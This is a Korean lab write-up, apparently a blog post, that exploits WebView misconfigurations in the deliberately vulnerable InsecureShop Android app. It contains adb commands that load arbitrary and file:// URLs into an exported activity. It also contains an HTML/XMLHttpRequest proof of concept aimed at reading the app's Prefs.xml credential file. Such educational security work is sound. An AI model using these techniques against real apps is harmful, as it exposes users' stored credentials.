---
title: "[AND - LAB] InsecureShop WebView 익스플로잇"
category: "블로그/기술문서/리서치"
thumbnail: "/assets/img/thumbnail/nyang.png"
date: "2026-11-14 21:50:00 +0900"
source_published_at: "2026. 11. 14. 21:50"
source_url: "https://chzong-hot0.tistory.com/7"
excerpt: "WebView란, 안드로이드 애플리케이션 내부에서 웹페이지를 표시할 수 있도록 하는 컴포넌트입니다."
tags:
  - "Android"
  - "InsecureShop"
  - "WebView"
---

{% raw %}
<div class="and-lab-article">
<div class="tt_article_useless_p_margin contents_style"><h3 data-ke-size="size23"><span>목표</span></h3>
<ul data-ke-list-type="disc" style="list-style-type: disc;">
<li>setAllowUniversalAccessFromFileURLs·setJavaScriptEnabled 등 안전하지 않은 WebView 설정을 이용해 file://로 내부파일을 유출하고 임의 URL을 로드</li>
<li>JavaScriptInterface RCE 차단 여부를 확인</li>
</ul>
<h3 data-ke-size="size23"><span>실습 환경</span></h3>
<ul data-ke-list-type="disc" style="list-style-type: disc;">
<li><span>Android Studio</span><span></span></li>
<li><span>AOSP Android 11 (API 30)</span></li>
<li><span>InsecureShop (취약 앱)</span><span></span></li>
</ul>
<h3 data-ke-size="size23"><span>1. file://로 내부파일 유출 및 임의 URL 로드</span></h3>
<p data-ke-size="size16"><span>WebView란, 안드로이드 애플리케이션 내부에서 웹페이지를 표시할 수 있도록 하는 컴포넌트입니다.</span><span></span></p>
<p data-ke-size="size16"><span></span><a href="https://developer.android.com/reference/android/webkit/WebView">https://developer.android.com/reference/android/webkit/WebView</a></p>
<figure contenteditable="false" data-ke-align="alignCenter" data-ke-type="opengraph" data-og-description="" data-og-host="developer.android.com" data-og-image="" data-og-source-url="https://developer.android.com/reference/android/webkit/WebView" data-og-title="WebView  |  API reference  |  Android Developers" data-og-type="website" data-og-url="https://developer.android.com/reference/android/webkit/WebView" id="og_1794656494726"><a data-source-url="https://developer.android.com/reference/android/webkit/WebView" href="https://developer.android.com/reference/android/webkit/WebView" rel="noopener" target="_blank">
<div class="og-image" style="background-image: url();"> </div>
<div class="og-text">
<p class="og-title" data-ke-size="size16">WebView  |  API reference  |  Android Developers</p>
<p class="og-desc" data-ke-size="size16"> </p>
<p class="og-host" data-ke-size="size16">developer.android.com</p>
</div>
</a></figure>
<p data-ke-size="size16"><span>WebView에서 JavaScript 실행이나 파일 접근을 안전하지 않게 허용할 경우 앱 내부에 저장된 데이터가 외부에 노출될 수 있습니다.</span></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16"><span>먼저 InsecureShop의 매니페스트 파일을 확인해보겠습니다.</span><span></span></p>
<p></p><figure class="imageblock alignCenter" data-ke-mobilestyle="widthOrigin" data-origin-height="347" data-origin-width="542"><span><img data-origin-height="347" data-origin-width="542" height="347" loading="lazy" src="/assets/img/and-lab/07/001.png" width="542"/></span></figure>
<p></p>
<p data-ke-size="size16"><span>매니페스트를 보면 </span><span>WebViewActivity</span><span>와 </span><span>WebView2Activity</span><span>가 선언되어 있습니다.</span></p>
<p data-ke-size="size16"><span>두 액티비티 모두 intent-filter를 가지고 있습니다.</span></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16"><span>특히 </span><span>WebView2Activity</span><span>에는 다음과 같은 intent-filter가 설정되어 있습니다.</span></p>
<p></p><figure class="imageblock alignCenter" data-filename="blob" data-ke-mobilestyle="widthOrigin" data-origin-height="134" data-origin-width="542"><span><img data-filename="blob" data-origin-height="134" data-origin-width="542" height="134" loading="lazy" src="/assets/img/and-lab/07/002.png" width="542"/></span></figure>
<p></p>
<p data-ke-size="size16"><span>exported=true</span><span>가 명시되어 있지는 않지만, intent-filter가 선언되어 있으므로 해당 Activity는 외부에서 호출할 수 있는 구조입니다.</span></p>
<p data-ke-size="size16"><span>그렇다면 외부에서 전달한 URL을 WebView에서 실행하도록 만들 수 있을 거라 생각했습니다.</span></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16"><span>WebView2Activity.kt</span><span> 코드를 확인해보겠습니다.</span><span></span></p>
<p></p><figure class="imageblock alignCenter" data-ke-mobilestyle="widthOrigin" data-origin-height="272" data-origin-width="532"><span><img data-origin-height="272" data-origin-width="532" height="272" loading="lazy" src="/assets/img/and-lab/07/003.png" width="532"/></span></figure>
<p></p>
<p data-ke-size="size16"><span>위 코드를 보면 </span><span>javaScriptEnabled</span><span>와 </span><span>allowUniversalAccessFromFileURLs</span><span>가 true로 설정되어 있습니다.</span></p>
<p data-ke-size="size16"><span>javaScriptEnabled</span><span>는 WebView에서 JavaScript 실행을 허용하는 설정입니다.</span><span></span></p>
<p data-ke-size="size16"><span>allowUniversalAccessFromFileURLs</span><span>는 </span><span>file://</span><span>로 로드된 문서의 JavaScript가 다른 출처의 리소스에 접근할 수 있도록 허용하는 설정입니다.</span></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16"><span>일반적으로 웹에서는 서로 다른 출처의 리소스에 접근하는 것이 제한됩니다. </span><span>하지만, </span><span>allowUniversalAccessFromFileURLs</span><span>를 활성화하면 </span><span>file://</span><span> 문서에서 실행된 JavaScript가 다른 로컬 파일이나 웹 리소스에 접근할 수 있습니다.</span></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16"><span>따라서, 외부에서 임의의 파일 URL을 전달할 수 있다면, 앱 내부파일에도 접근할 수 있을 거라 생각했습니다.</span></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16">같은 소스코드의 URL 처리 부분을 보겠습니다.</p>
<p></p><figure class="imageblock alignCenter" data-filename="blob" data-ke-mobilestyle="widthOrigin" data-origin-height="135" data-origin-width="532"><span><img data-filename="blob" data-origin-height="135" data-origin-width="532" height="135" loading="lazy" src="/assets/img/and-lab/07/004.png" width="532"/></span></figure>
<p></p>
<p data-ke-size="size16"><span>위 코드를 보면 Intent로 전달받은 URL을 </span><span>webview.loadUrl()</span><span>로 로드하는 것을 확인할 수 있는데, </span><span>이 과정에서 URL의 스킴이나 호스트를 검증하는 코드가 없습니다.</span></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16"><span>즉, 외부에서 URL을 전달하면 해당 URL이 그대로 WebView에 로드될 수 있는 구조입니다.</span></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16"><span>먼저 임의의 URL을 로드할 수 있는지 확인해보겠습니다.</span></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16"><span>adb 명령어는 다음과 같습니다.</span></p>
<pre class="bash" data-ke-language="bash"><code class="hljs">adb shell am start -W -n com.insecureshop/.WebView2Activity --es url <span class="hljs-string">"https://example.com"</span></code></pre>
<p data-ke-size="size16"> </p>
<p></p><figure class="imageblock alignCenter" data-ke-mobilestyle="widthOrigin" data-origin-height="149" data-origin-width="1091"><span><img data-origin-height="149" data-origin-width="1091" height="149" loading="lazy" src="/assets/img/and-lab/07/005.png" width="1091"/></span></figure>
<p></p>
<p data-ke-size="size16"> </p>
<p></p><figure class="imageblock alignCenter" data-ke-mobilestyle="widthOrigin" data-origin-height="531" data-origin-width="248"><span><img data-origin-height="531" data-origin-width="248" height="531" loading="lazy" src="/assets/img/and-lab/07/006.png" width="248"/></span></figure>
<p></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16"><span>이번에는 </span><span>file://</span><span> 스킴을 이용해 앱 내부파일에 접근해보겠습니다.</span></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16"><span>file://</span><span>는 로컬 파일을 가리키는 URL 스킴입니다.</span></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16"><span>이전 포스트인 ContentProvider 실습을 수행하면서 InsecureShop의 SharedPreferences 파일인 </span><span>Prefs.xml</span><span>에 사용자명과 비밀번호 등이 저장되는 것을 확인했었습니다.</span></p>
<p data-ke-size="size16"><span>이번에도 해당 파일을 대상으로 삼았습니다.</span></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16"><span>Prefs.kt</span><span> 코드를 확인해보겠습니다. Prefs.kt는 \src\main\java\com\insecureshop\util\Prefs.kt 경로에 있습니다.</span><span></span></p>
<p></p><figure class="imageblock alignCenter" data-ke-mobilestyle="widthOrigin" data-origin-height="247" data-origin-width="592"><span><img data-origin-height="247" data-origin-width="592" height="247" loading="lazy" src="/assets/img/and-lab/07/007.png" width="592"/></span></figure>
<p></p>
<p data-ke-size="size16"><span>위 코드에서 sharedpreferences = context.getSharedPreferences("Prefs", Context.MODE_PRIVATE) 부분에서  </span><span>Prefs</span><span>라는 이름의 SharedPreferences를 생성합니다.</span></p>
<p data-ke-size="size16"><span>예전에 작성한 포스트에서도 설명한 적이 있지만,.,. SharedPreferences는 데이터를 키-값 형태로 저장하는 기능이며, 해당 데이터는 일반적으로 xml 파일에 저장됩니다.</span></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16"><span>Prefs.kt</span><span>에서는 </span><span>username</span><span>, </span><span>password</span><span>, </span><span>data</span><span> 등의 값을 이 파일에 저장하고 있습니다.</span></p>
<p data-ke-size="size16"><span>해당 파일의 경로는 다음과 같습니다.</span></p>
<pre class="bash" data-ke-language="bash" data-ke-type="codeblock" id="code_1794657777792"><code class="hljs">/data/user/0/com.insecureshop/shared_prefs/Prefs.xml</code></pre>
<p data-ke-size="size16"><span>WebView에 해당 파일 경로를 전달하면 내부 데이터를 읽을 수 있을 거라 생각했습니다.</span></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16"><span>다음 명령어를 실행해보겠습니다.</span></p>
<pre class="bash" data-ke-language="bash"><code class="hljs">adb shell am start -W -n com.insecureshop/.WebView2Activity --es url <span class="hljs-string">"file:///data/user/0/com.insecureshop/shared_prefs/Prefs.xml"</span></code></pre>
<p data-ke-size="size16"> </p>
<p></p><figure class="imageblock alignCenter" data-ke-mobilestyle="widthOrigin" data-origin-height="165" data-origin-width="1269"><span><img data-origin-height="165" data-origin-width="1269" height="165" loading="lazy" src="/assets/img/and-lab/07/008.png" width="1269"/></span></figure>
<p></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16">화질이 저시기...하지만 외부에서 전달한 URL을 통해 앱 내부 파일에 접근할 수 있다는 걸 확인하는 데 성공했습니다.</p>
<p data-ke-size="size16"> </p>
<p></p><figure class="imageblock alignCenter" data-ke-mobilestyle="widthOrigin" data-origin-height="166" data-origin-width="250"><span><img data-origin-height="166" data-origin-width="250" height="166" loading="lazy" src="/assets/img/and-lab/07/009.png" width="250"/></span></figure>
<p></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16"><span>이제 JavaScript를 이용해 외부에서 내부파일을 읽어보겠습니다.</span></p>
<p data-ke-size="size16"><span>allowUniversalAccessFromFileURLs</span><span>는 </span><span>file://</span><span>로 로드된 문서의 JavaScript가 다른 출처의 리소스에 접근할 수 있도록 허용하므로, html 파일에 JavaScript를 작성하여 확인해보겠습니다.</span></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16"><span>먼저 </span><span>webview_poc.html</span><span> 파일을 생성하고 다음 코드를 작성했습니다.</span></p>
<pre class="html xml" data-ke-language="html"><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>WebView Test<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>WebView File Access Test<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"js"</span>&gt;</span>JavaScript not executed<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">pre</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"result"</span>&gt;</span>Loading...<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"js"</span>).textContent =
    <span class="hljs-string">"JavaScript executed"</span>;

<span class="hljs-keyword">const</span> target =
    <span class="hljs-string">"file:///data/user/0/com.insecureshop/shared_prefs/Prefs.xml"</span>;

<span class="hljs-keyword">const</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();

xhr.open(<span class="hljs-string">"GET"</span>, target, <span class="hljs-literal">true</span>);

xhr.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{
    <span class="hljs-keyword">const</span> data = xhr.responseText;

    <span class="hljs-keyword">if</span> (data.includes(<span class="hljs-string">"&lt;map"</span>) &amp;&amp; data.includes(<span class="hljs-string">"&lt;/map&gt;"</span>)) {
        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"result"</span>).textContent =
            data;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"result"</span>).textContent =
            <span class="hljs-string">"File response is empty or invalid"</span>;
    }
};

xhr.onerror = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{
    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"result"</span>).textContent =
        <span class="hljs-string">"File read failed"</span>;
};

xhr.send();
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p data-ke-size="size16"><span>위 코드에서는 </span><span>XMLHttpRequest(js에서 리소스에 대한 요청을 생성하고, 응답을 처리하는 객체)</span><span>를 이용해 Prefs.xml 파일을 읽도록 하였습니다.</span><span></span></p>
<p data-ke-size="size16"><span>xhr.open("GET", target, true)</span><span>에서 target에 지정된 파일 경로로 GET 요청을 보내고, </span><span>이후 </span><span>xhr.responseText</span><span>를 통해 응답 내용을 문자열 형태로 가져옵니다.</span></p>
<p data-ke-size="size16"><span>그리고, 가져온 데이터가 XML 형태인지 확인한 뒤 </span><span>textContent</span><span>를 이용해 WebView 화면에 출력하도록 하였습니다.</span><span></span></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16"><span>다음 명령어로 html 파일을 전송하였습니다. (이때 webview_pco.html 파일은 InsecureShop 실행 경로와 같은 경로에 두었습니다.)</span></p>
<pre class="html xml" data-ke-language="html"><code class="hljs xml">adb push .\webview_poc.html /sdcard/Download/webview_poc.html</code></pre>
<p data-ke-size="size16">전송 성공</p>
<p></p><figure class="imageblock alignCenter" data-ke-mobilestyle="widthOrigin" data-origin-height="39" data-origin-width="855"><span><img data-origin-height="39" data-origin-width="855" height="39" loading="lazy" src="/assets/img/and-lab/07/010.png" width="855"/></span></figure>
<p></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16"><span>전송한 파일을 WebView에서 로드하기 위한 명령어는 다음과 같습니다.</span></p>
<pre class="html xml" data-ke-language="html"><code class="hljs xml">adb shell am start -W -n com.insecureshop/.WebView2Activity --es url "file:///sdcard/Download/webview_poc.html"</code></pre>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16">명령어 실행 결과를 보면 status가 ok인데...</p>
<p></p><figure class="imageblock alignCenter" data-ke-mobilestyle="widthOrigin" data-origin-height="149" data-origin-width="1252"><span><img data-origin-height="149" data-origin-width="1252" height="149" loading="lazy" src="/assets/img/and-lab/07/011.png" width="1252"/></span></figure>
<p></p>
<p data-ke-size="size16">WebView 화면은 해당 파일에 접근하지 못했다는 오류가 발생했다고 떴습니다.</p>
<p></p><figure class="imageblock alignCenter" data-ke-mobilestyle="widthOrigin" data-origin-height="164" data-origin-width="248"><span><img data-origin-height="164" data-origin-width="248" height="164" loading="lazy" src="/assets/img/and-lab/07/012.png" width="248"/></span></figure>
<p></p>
<p data-ke-size="size16">아마 API 30 버전을 사용하고 있어서 외부 저장소 접근 정책 같은 것에 걸리지 않았나 싶습니다...</p>
<p data-ke-size="size16"> </p>
<h3 data-ke-size="size23"><span>2. JavaScriptInterface RCE 차단 여부 확인</span></h3>
<p data-ke-size="size16"><span>JavaScriptInterface란, WebView 내부에서 실행되는 JavaScript가 안드로이드 애플리케이션의 java 또는 kotlin 메서드를 호출할 수 있도록 연결하는 기능입니다.</span><span></span></p>
<p data-ke-size="size16"><span></span><a href="https://developer.android.com/reference/android/webkit/WebView#addJavascriptInterface(java.lang.Object,%20java.lang.String)">https://developer.android.com/reference/android/webkit/WebView#addJavascriptInterface(java.lang.Object,%20java.lang.String)</a></p>
<figure contenteditable="false" data-ke-align="alignCenter" data-ke-type="opengraph" data-og-description="" data-og-host="developer.android.com" data-og-image="" data-og-source-url="https://developer.android.com/reference/android/webkit/WebView#addJavascriptInterface(java.lang.Object,%20java.lang.String)" data-og-title="WebView  |  API reference  |  Android Developers" data-og-type="website" data-og-url="https://developer.android.com/reference/android/webkit/WebView" id="og_1794656589627"><a data-source-url="https://developer.android.com/reference/android/webkit/WebView#addJavascriptInterface(java.lang.Object,%20java.lang.String)" href="https://developer.android.com/reference/android/webkit/WebView#addJavascriptInterface(java.lang.Object,%20java.lang.String)" rel="noopener" target="_blank">
<div class="og-image" style="background-image: url();"> </div>
<div class="og-text">
<p class="og-title" data-ke-size="size16">WebView  |  API reference  |  Android Developers</p>
<p class="og-desc" data-ke-size="size16"> </p>
<p class="og-host" data-ke-size="size16">developer.android.com</p>
</div>
</a></figure>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16" data-pm-slice="1 1 []"><span>앞서 InsecureShop의 WebView 설정에서 </span><span>javaScriptEnabled</span><span>가 true로 설정되어 있는 것을 확인했습니다.</span></p>
<p data-ke-size="size16" data-pm-slice="1 1 []"> </p>
<p data-ke-size="size16"><span>그렇다면 js를 통해 안드로이드의 네이티브 메서드까지 호출할 수 있는지 확인해보겠습니다.</span></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16"><span>먼저 WebView2Activity.kt 소스코드를 확인해보겠습니다.</span></p>
<p></p><figure class="imageblock alignCenter" data-ke-mobilestyle="widthOrigin" data-origin-height="272" data-origin-width="532"><span><img data-origin-height="272" data-origin-width="532" height="272" loading="lazy" src="/assets/img/and-lab/07/003.png" width="532"/></span></figure>
<p></p>
<p data-ke-size="size16"><span>위 코드를 보면 js 실행을 허용하는 설정은 존재하지만, </span><span>addJavascriptInterface()</span><span>를 이용해 객체를 등록하는 부분은 없었습니다.</span></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16"><span>혹시나... 다른 클래스에서 인터페이스를 등록하고 있을 가능성도 있으므로, 앱 전체에서 관련 메서드를 검색해봤습니다.</span></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16"><span>jadx에서 전체 검색 기능을 이용해 </span><span>addJavascriptInterface, </span><span>JavascriptInterface와 같은 단어들을 입력해보았지만 찾을 수 없었습니다. 업숴...</span></p>
<p></p><figure class="imageblock alignCenter" data-ke-mobilestyle="widthOrigin" data-origin-height="1079" data-origin-width="1906"><span><img data-origin-height="1079" data-origin-width="1906" height="1079" loading="lazy" src="/assets/img/and-lab/07/013.png" width="1906"/></span></figure>
<p></p>
<p data-ke-size="size16"> </p>
<p data-ke-size="size16" data-pm-slice="1 1 []"><span>여기서 JavaScriptInterface가 존재하지 않는다고 해서 RCE 공격이 차단되었다고 볼 수는 없습니다.</span><span></span></p>
<p data-ke-size="size16" data-pm-slice="1 1 []"> </p>
<p data-ke-size="size16" data-pm-slice="1 1 []"><span>따라서, 이번 실습에서는 JavaScriptInterface를 통한 RCE 공격이 차단된 것이 아니라, RCE로 이어질 수 있는 JavaScriptInterface를 확인할 수 없다고 판단했습니다.</span></p></div>
</div>
{% endraw %}
